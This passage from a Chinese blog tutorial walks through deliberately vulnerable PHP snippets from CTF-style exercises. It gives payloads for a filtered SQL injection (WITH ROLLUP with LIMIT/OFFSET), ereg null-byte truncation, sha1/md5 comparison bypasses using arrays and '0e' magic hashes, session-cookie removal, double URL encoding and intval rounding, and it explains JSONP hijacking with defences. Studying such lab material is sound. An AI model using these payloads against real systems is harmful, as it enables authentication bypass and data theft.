$<span style="color: #a0522d;">filter</span> = <span style="color: #8b2252;">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;
<span style="color: #0000ff;">foreach</span>($<span style="color: #a0522d;">_POST</span> as $<span style="color: #a0522d;">key</span>=&gt;$<span style="color: #a0522d;">value</span>){
//&#36941;&#21382;&#25968;&#32452;
  AttackFilter($<span style="color: #a0522d;">key</span>,$<span style="color: #a0522d;">value</span>,$<span style="color: #a0522d;">filter</span>);
}
$<span style="color: #a0522d;">con</span> = mysql_connect(<span style="color: #8b2252;">"XXXXXX"</span>,<span style="color: #8b2252;">"XXXXXX"</span>,<span style="color: #8b2252;">"XXXXXX"</span>);
<span style="color: #a020f0;">if</span> (!$<span style="color: #a0522d;">con</span>){
  die(<span style="color: #8b2252;">'Could not connect: '</span> . mysql_error());
}
$<span style="color: #a0522d;">db</span>=<span style="color: #8b2252;">"XXXXXX"</span>;
<span style="color: #0000ff;">mysql_select_db</span>($<span style="color: #a0522d;">db</span>, $<span style="color: #a0522d;">con</span>);
//&#35774;&#32622;&#27963;&#21160;&#30340; MySQL &#25968;&#25454;&#24211;
$<span style="color: #a0522d;">sql</span>=<span style="color: #8b2252;">"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'"</span>;
$<span style="color: #a0522d;">query</span> = mysql_query($<span style="color: #a0522d;">sql</span>);
//&#25191;&#34892;&#19968;&#26465; MySQL &#26597;&#35810;
<span style="color: #a020f0;">if</span> (mysql_num_rows($<span style="color: #a0522d;">query</span>) == 1) {
//&#36820;&#22238;&#32467;&#26524;&#38598;&#20013;&#34892;&#30340;&#25968;&#30446;
  $<span style="color: #a0522d;">key</span> = mysql_fetch_array($<span style="color: #a0522d;">query</span>);
//&#36820;&#22238;&#26681;&#25454;&#20174;&#32467;&#26524;&#38598;&#21462;&#24471;&#30340;&#34892;&#29983;&#25104;&#30340;&#25968;&#32452;&#65292;&#22914;&#26524;&#27809;&#26377;&#26356;&#22810;&#34892;&#21017;&#36820;&#22238; false
  <span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">key</span>[<span style="color: #8b2252;">'pwd'</span>] == $<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'pwd'</span>]) {
    print <span style="color: #8b2252;">"www.xxx.com"</span>;
 }<span style="color: #a020f0;">else</span>{
    print <span style="color: #8b2252;">"error"</span>;
 }
}<span style="color: #a020f0;">else</span>{
  print <span style="color: #8b2252;">"error&#65281;"</span>;
}
<span style="color: #0000ff;">mysql_close</span>($<span style="color: #a0522d;">con</span>);
?&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">if</span> (mysql_num_rows($<span style="color: #a0522d;">query</span>) == 1) {
//&#36820;&#22238;&#32467;&#26524;&#38598;&#20013;&#34892;&#30340;&#25968;&#30446;
  $<span style="color: #a0522d;">key</span> = mysql_fetch_array($<span style="color: #a0522d;">query</span>);
//&#36820;&#22238;&#26681;&#25454;&#20174;&#32467;&#26524;&#38598;&#21462;&#24471;&#30340;&#34892;&#29983;&#25104;&#30340;&#25968;&#32452;&#65292;&#22914;&#26524;&#27809;&#26377;&#26356;&#22810;&#34892;&#21017;&#36820;&#22238; false
  <span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">key</span>[<span style="color: #8b2252;">'pwd'</span>] == $<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'pwd'</span>]) {
    print <span style="color: #8b2252;">"www.xxx.com"</span>;
 }<span style="color: #a020f0;">else</span>{
    print <span style="color: #8b2252;">"error"</span>;
 }
</pre>
</div>

<p>
查看代码发现，注入成功要满足2个条件：
</p>
<ol class="org-ol">
<li>mysql_num_rows($query) == 1 ,也就是查询返回的结果行数为1</li>
<li>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</li>
</ol>

<p>
其中filter 对特殊字符进行了过滤，但是没有过滤 or ,因此可以使用or将表的内容都查询出来
</p>

<p>
<code>$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";</code>
</p>

<p>
限制查询结果为 1 行，则可以使用 limit，offset 关键字
</p>

<p>
思路：
如果能做出来查出来的密码是空，就可以判断左右相等了。这里使用mysql中函数 with rollup 对列求和，密码是字符串求和为空。
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select user,password from users where <span style="color: #a0522d;">user</span>=<span style="color: #8b2252;">'admin'</span> or 1 group by password with
rollup;
+---------+----------------------------------+
| user   | password             |
+---------+----------------------------------+
| pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| admin  | 14c879f3f5d8ed93a09f6090d77c2cc3 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| gordonb | NULL               |
+---------+----------------------------------+
6 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select user,password from users where <span style="color: #a0522d;">user</span>=<span style="color: #8b2252;">'admin'</span> or 1 group by password with
rollup limit 1 offset 5;
+---------+----------+
| user   | password |
+---------+----------+
| gordonb | NULL   |
+---------+----------+
1 row<span style="color: #a020f0;"> in</span> set (0.01 sec)
</pre>
</div>

<p>
因此Payload可以写为如下语句:
</p>

<p>
<code>admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</code>
</p>

<p>
使用 WITH ROLLUP，此函数是对聚合函数进行求和， with rollup是对 group by 后的第一个字段，进行分组求和。
</p>
</div>
</div>
<div id="outline-container-h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006" class="outline-3">
<h3 id="h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">5 ereg正则%00截断</h3>
<div class="outline-text-3" id="text-h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">
<p>
<code>ereg</code> 函数使用需要PHP版本在5.3及以下
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">flag</span> = <span style="color: #8b2252;">"flag"</span>;
<span style="color: #a020f0;">if</span> (isset ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]))
{
 <span style="color: #a020f0;">if</span> (ereg (<span style="color: #8b2252;">"^[a-zA-Z0-9]+$"</span>, $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]) === FALSE)
{
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;
}
 <span style="color: #a020f0;">else if</span> (strlen($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]) &lt; 8 &amp;&amp; $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>] &gt; 9999999)
 {
  <span style="color: #a020f0;">if</span> (strpos ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>], <span style="color: #8b2252;">'*-*'</span>) !== FALSE) //strpos &#8212; &#26597;&#25214;&#23383;&#31526;&#20018;&#39318;&#27425;&#20986;&#29616;&#30340;&#20301;&#32622;
  {
   die(<span style="color: #8b2252;">'Flag: '</span> . $<span style="color: #a0522d;">flag</span>);
  }
   <span style="color: #a020f0;">else</span>
  {
    <span style="color: #483d8b;">echo</span>(<span style="color: #8b2252;">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);
   }
  }
  <span style="color: #a020f0;">else</span>
  {
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;
  }
 }
?&gt;
</pre>
</div>

<p>
1.GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母
2.strlen()限制了长度小于8并且大小必须大于9999999
3.继续strpos()对password进行匹配，必须含有 <b>-</b> ，最终才输出flag
</p>

<p>
因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。
</p>

<p>
对于另一个问题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上 <b>-</b> 。于是乎构造 password=1e8%00*-* ,成功得到答案
</p>
</div>
</div>
<div id="outline-container-h:1a75de0b-df2a-4e37-8680-86dcd2955ed4" class="outline-3">
<h3 id="h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">7 sha()函数比较绕过</h3>
<div class="outline-text-3" id="text-h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">flag</span> = <span style="color: #8b2252;">"xxx"</span>;
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>]) and isset($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]))
{
  <span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>] == $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>])
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;
  <span style="color: #a020f0;">else if</span> (sha1($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>]) === sha1($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]))
   die(<span style="color: #8b2252;">'Flag: '</span>.$<span style="color: #a0522d;">flag</span>);
  <span style="color: #a020f0;">else</span>
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;
}
<span style="color: #a020f0;">else</span>
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;
?&gt;
</pre>
</div>

<p>
注意：同样需要老版本的php
</p>

<p>
<code>http://127.0.0.1/07.php?name[]=1&amp;password[]=2</code>
</p>

<p>
<code>=</code> 会比较类型，比如 bool sha1() 函数和 md5() 函数存在着漏洞， sha1() 函数默认的传入参数类型是字符串型，传入数组的情况下出现错误，使 sha1() 函数返回错误，也就是返回 false ，这时 <code>=</code> 运算符就判断为true，需要构造 username 和 password 既不相等，又同样是数组类型
</p>

<p>
可以用如下代码进行测试
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">a</span>[] = 1;
$<span style="color: #a0522d;">b</span>[] = 2;
<span style="color: #0000ff;">var_dump</span>(sha1($<span style="color: #a0522d;">a</span>) === sha1($<span style="color: #a0522d;">b</span>));

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36755;&#20986;</span>
<span style="color: #0000ff;">bool</span>(true)
PHP Warning:  sha1() expects parameter 1 to be string, array given<span style="color: #a020f0;"> in</span> C:\Users\Administrator\Desktop\shell\07-test.php on line 4
PHP Warning:  sha1() expects parameter 1 to be string, array given<span style="color: #a020f0;"> in</span> C:\Users\Administrator\Desktop\shell\07-test.php on line 4
</pre>
</div>
</div>
</div>
<div id="outline-container-h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782" class="outline-3">
<h3 id="h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">8 SESSION验证绕过</h3>
<div class="outline-text-3" id="text-h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">flag</span> = <span style="color: #8b2252;">"xxx"</span>;
<span style="color: #0000ff;">session_start</span>(); //&#21551;&#21160;&#19968;&#20010;session
<span style="color: #a020f0;">if</span> (isset ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>])) {
  <span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>] == $<span style="color: #a0522d;">_SESSION</span>[<span style="color: #8b2252;">'password'</span>])
    die (<span style="color: #8b2252;">'Flag: '</span>.$<span style="color: #a0522d;">flag</span>);
  <span style="color: #a020f0;">else</span>
    print <span style="color: #8b2252;">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;
}
<span style="color: #0000ff;">mt_srand</span>((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));  //session&#20013;&#20869;&#23481;&#27599;&#27425;&#37117;&#26159;&#38543;&#26426;&#30340;
?&gt;
</pre>
</div>

<p>
看关键的一行 <code>if ($_GET['password'] == $_SESSION['password'])</code>
</p>

<p>
需要session中的password值和用户传的一样，就可以成功拿到flag
</p>

<p>
所以我们只需要删掉session值，或者修改session值为一个不存在的session，这样服务器获取不到session，则password为空，我们传一个空的password的进去即可拿到flag。
</p>

<p>
我们利用的原理如下：
<b>在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，sessionID可在cookie中找到，当我们删除cookie中的sessionID后，$_SESSION[‘password’]就会返回空，我们同样传入空的password就能绕过了。</b>
</p>

<p>
因此 payload 为 <code>password=</code> 且 删除 cookie的值
</p>

<p>
<a href="http://127.0.0.1/08.php?password">http://127.0.0.1/08.php?password</a>=
</p>
</div>
</div>
<div id="outline-container-h:97daa910-2762-4282-9e2b-3f4a56cd82a2" class="outline-3">
<h3 id="h:97daa910-2762-4282-9e2b-3f4a56cd82a2">9 密码md5比较绕过</h3>
<div class="outline-text-3" id="text-h:97daa910-2762-4282-9e2b-3f4a56cd82a2">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #0000ff;">error_reporting</span>(0);
$<span style="color: #a0522d;">flag</span> = <span style="color: #8b2252;">'flag{xxx}'</span>;
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'username'</span>]) and isset($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>])) {
  <span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'username'</span>] == $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>])
    print <span style="color: #8b2252;">'Your password can not be your username.'</span>;
  <span style="color: #a020f0;">else if</span> (md5($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'username'</span>]) == md5($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'password'</span>]))
    die(<span style="color: #8b2252;">'Flag: '</span>.$<span style="color: #a0522d;">flag</span>);
  <span style="color: #a020f0;">else</span>
    print <span style="color: #8b2252;">'Invalid password'</span>;
}
?&gt;
</pre>
</div>

<p>
若为 <code>md5($_GET['username']) == md5($_GET['password'])</code> 则可以构造： <a href="http://172.22.0.5/09.php?username=QNKCDZO&amp;password=240610708">http://172.22.0.5/09.php?username=QNKCDZO&amp;password=240610708</a> 因为 == 对比的时候会进行数据转换， 0eXXXXXXXXXX 转成 0 了
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">md5</span>(<span style="color: #8b2252;">'240610708'</span>) //0e462097431906509019562988736854
<span style="color: #0000ff;">md5</span>(<span style="color: #8b2252;">'QNKCDZO'</span>) //0e830400451993494058024219903391
0e &#32431;&#25968;&#23383;&#36825;&#31181;&#26684;&#24335;&#30340;&#23383;&#31526;&#20018;&#22312;&#21028;&#26029;&#30456;&#31561;&#30340;&#26102;&#20505;&#20250;&#34987;&#35748;&#20026;&#26159;&#31185;&#23398;&#35745;&#25968;&#27861;&#30340;&#25968;&#23383;&#65292;&#20808;&#20570;&#23383;&#31526;&#20018;&#21040;&#25968;&#23383;&#30340;&#36716;&#25442;&#12290;
<span style="color: #0000ff;">md5</span>(<span style="color: #8b2252;">'240610708'</span>)==md5(<span style="color: #8b2252;">'QNKCDZO'</span>); //True
<span style="color: #0000ff;">md5</span>(<span style="color: #8b2252;">'240610708'</span>)===md5(<span style="color: #8b2252;">'QNKCDZO'</span>); //False

&#36825;&#26679;&#30340;&#23545;&#24212;&#25968;&#20540;&#36824;&#26377;&#65306;
<span style="color: #0000ff;">var_dump</span>(md5(<span style="color: #8b2252;">'240610708'</span>) == md5(<span style="color: #8b2252;">'QNKCDZO'</span>));
<span style="color: #0000ff;">var_dump</span>(md5(<span style="color: #8b2252;">'aabg7XSs'</span>) == md5(<span style="color: #8b2252;">'aabC9RqS'</span>));
<span style="color: #0000ff;">var_dump</span>(sha1(<span style="color: #8b2252;">'aaroZmOk'</span>) == sha1(<span style="color: #8b2252;">'aaK1STfY'</span>));
<span style="color: #0000ff;">var_dump</span>(sha1(<span style="color: #8b2252;">'aaO8zKZF'</span>) == sha1(<span style="color: #8b2252;">'aa3OFF9m'</span>));
<span style="color: #0000ff;">var_dump</span>(<span style="color: #8b2252;">'0010e2'</span> == <span style="color: #8b2252;">'1e3'</span>);
<span style="color: #0000ff;">var_dump</span>(<span style="color: #8b2252;">'0x1234Ab'</span> == <span style="color: #8b2252;">'1193131'</span>);
<span style="color: #0000ff;">var_dump</span>(<span style="color: #8b2252;">'0xABCdef'</span> == <span style="color: #8b2252;">' 0xABCdef'</span>);
</pre>
</div>

<p>
也可以使用数组绕过 <code>http://127.0.0.1/09.php?username[]=1&amp;password[]=2</code>
</p>

<p>
但此处是 <code>=</code> ，只能用数组绕过， PHP 对数组进行 hash 计算都会得出 null 的空值
</p>

<p>
<a href="http://127.0.0.1/Php_Bug/18.php?username%5B%5D=1&amp;password%5B%5D=2">http://127.0.0.1/Php_Bug/18.php?username%5B%5D=1&amp;password%5B%5D=2</a>
</p>
</div>
</div>
<div id="outline-container-h:e15abb1d-6d4f-4988-b030-b936e16e9e9a" class="outline-3">
<h3 id="h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">10 urldecode二次编码绕过</h3>
<div class="outline-text-3" id="text-h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">
<p>
只有代码本身代码编码时，才能用多重编码。url编码浏览器自动解码一次，服务器解码n次
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
// if(eregi(<span style="color: #8b2252;">"mbc"</span>,$<span style="color: #a0522d;">_GET</span>[id])) { // &#33719;&#24471;get&#35831;&#27714;&#30340;id&#65292;&#37324;&#38754;&#24517;&#39035;&#24102;xxx&#23383;&#31526;
<span style="color: #a020f0;">if</span>(mb_ereg(<span style="color: #8b2252;">"mbc"</span>,$<span style="color: #a0522d;">_GET</span>[id])) { // &#33719;&#24471;get&#35831;&#27714;&#30340;id&#65292;&#37324;&#38754;&#24517;&#39035;&#24102;xxx&#23383;&#31526;
 <span style="color: #483d8b;">echo</span>(<span style="color: #8b2252;">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);
 <span style="color: #a020f0;">exit</span>();
}
$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'id'</span>] = urldecode($<span style="color: #a0522d;">_GET</span>[id]); // &#20351;&#29992;urldecode&#33719;&#21462;get&#35831;&#27714;&#20013;id
<span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">_GET</span>[id] == <span style="color: #8b2252;">"mbc"</span>)
{
 <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;
 <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;p&gt;flag: This is mbc flag!!!} &lt;/p&gt;"</span>;
}
?&gt;
</pre>
</div>

<p>
由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。 如 %2527 ，两次urldecode会最后变成 '
</p>

<p>
我们将 flag 中第一个字符 m 进行url二次编码， URL 编码为： %6d ，二次编码为 %256d ，绕过<a href="http://172.22.0.5/10.php?id=%256dbc">http://172.22.0.5/10.php?id=%256dbc</a>
</p>
</div>
</div>
<div id="outline-container-h:0e55213c-f905-434e-96c2-e55e33877dff" class="outline-3">
<h3 id="h:0e55213c-f905-434e-96c2-e55e33877dff">11 intval函数取整</h3>
<div class="outline-text-3" id="text-h:0e55213c-f905-434e-96c2-e55e33877dff">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">_GET</span>[id]) {
 mysql_connect(SAE_MYSQL_HOST_M . <span style="color: #8b2252;">':'</span> .
SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
 mysql_select_db(SAE_MYSQL_DB);
 $<span style="color: #a0522d;">id</span> = intval($<span style="color: #a0522d;">_GET</span>[id]);
 $<span style="color: #a0522d;">query</span> = @mysql_fetch_array(mysql_query(<span style="color: #8b2252;">"select content from ctf2 where id='$id'"</span>));
 <span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">_GET</span>[id]==1024) {
   <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;
}
 <span style="color: #a020f0;">else</span>{
  <span style="color: #483d8b;">echo</span>($<span style="color: #a0522d;">query</span>[content]);
}
}
?&gt;
</pre>
</div>

<p>
要输入的值就是1024，但1024不让查，怎么办？
</p>

<p>
1024.1 绕过
</p>
</div>
</div>
<div id="outline-container-h:b0255428-392d-4422-b5da-88bd7d24e836" class="outline-3">
<h3 id="h:b0255428-392d-4422-b5da-88bd7d24e836">12 jsonp劫持</h3>
<div class="outline-text-3" id="text-h:b0255428-392d-4422-b5da-88bd7d24e836">
<p>
<b>JSONP原理</b>
</p>

<p>
JavaScript是一种在Web开发中经常使用的前端动态脚本技术。在JavaScript中，有一个很重要的安全性限制，被称为“Same-Origin Policy”（同源策略）。这一策略对于JavaScript代码能够访问的页面内容做了很重要的限制，即JavaScript只能访问与包含它的文档在同一域下的内容。
</p>

<p>
利用在页面中创建 &lt;script&gt; 节点的方法向不同域提交HTTP请求的方法称为JSONP，这项技术可以解决跨域提交Ajax请求的问题。
</p>

<p>
JSONP的最基本的原理是：动态添加一个 &lt;script&gt; 标签，而script标签的src属性是没有跨域的限制的。
</p>

<p>
简单的例子：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;!DOCTYPE html PUBLIC <span style="color: #8b2252;">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
<span style="color: #8b2252;">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt; 
&lt;html <span style="color: #a0522d;">xmlns</span>=<span style="color: #8b2252;">"http://www.w3.org/1999/xhtml"</span> &gt; 
&lt;head&gt; 
&lt;title&gt;Test Jsonp&lt;/title&gt;
 &lt;script <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text/javascript"</span>&gt; 
 <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">jsonpCallback</span>(result)
{ 
 alert(result.msg); 
} 
 &lt;/script&gt;
 &lt;script <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text/javascript"</span><span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"http://xxx.com/jsonServerResponse?</span>
<span style="color: #8b2252;">jsonp=jsonpCallback"</span>&gt;&lt;/script&gt; 
&lt;/head&gt; 
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt; 
</pre>
</div>

<p>
其中 jsonCallback 是客户端注册的，获取跨域服务器上的json数据后，回调的函数。
</p>

<p>
<a href="http://xxx.com/jsonServerResponse?jsonp=jsonpCallback">http://xxx.com/jsonServerResponse?jsonp=jsonpCallback</a> 这个 url 是跨域服务器取 json 数据的接口，参数为回调函数的名字，返回的格式为： jsonpCallback({msg:'this is json data'})
</p>

<p>
简述原理与过程：首先在客户端注册一个callback, 然后把callback的名字传给服务器。此时，服务器先生成 json数据。 然后以 javascript 语法的方式，生成一个function , function 名字就是传递上来的参数 jsonp。最后将json 数据直接以入参的方式，放置到 function 中，这样就生成了一段 js 语法的文档，返回给客户端。
</p>

<p>
客户端浏览器，解析script标签，并执行返回的 javascript 文档，此时数据作为参数，传入到了客户端预先定义好的 callback 函数里。（动态执行回调函数）
</p>

<p>
可以使用PHP模拟后端服务器，返回json内容
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">call_method</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'jsonp'</span>];
<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">call_method</span> . <span style="color: #8b2252;">"({msg: 'xxx json data'})"</span>;
</pre>
</div>


<p>
浏览器在登录状态下，攻击者可通过jsonp拿到用户的登录信息并发送给攻击者。
</p>

<p>
漏洞发现与修复：
检查：
</p>
<ul class="org-ul">
<li>人工参透，发现代码中有jsonp或callback字符的多留意一下。</li>
<li>查看返回值，是否带函数调用。如jsonpCallback(msg)</li>
</ul>

<p>
防御：
</p>
<ul class="org-ul">
<li>是否是敏感数据。如果不是，无所谓。如果是要去掉jsonp方式调用，开启同源策略，让后端处理对应逻辑。</li>
<li>自动化发现漏洞。写自动化代码扫描工具，检查有callback特征的、对应script src请求标签中是否有和页面定义函数名相同的特征</li>
</ul>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
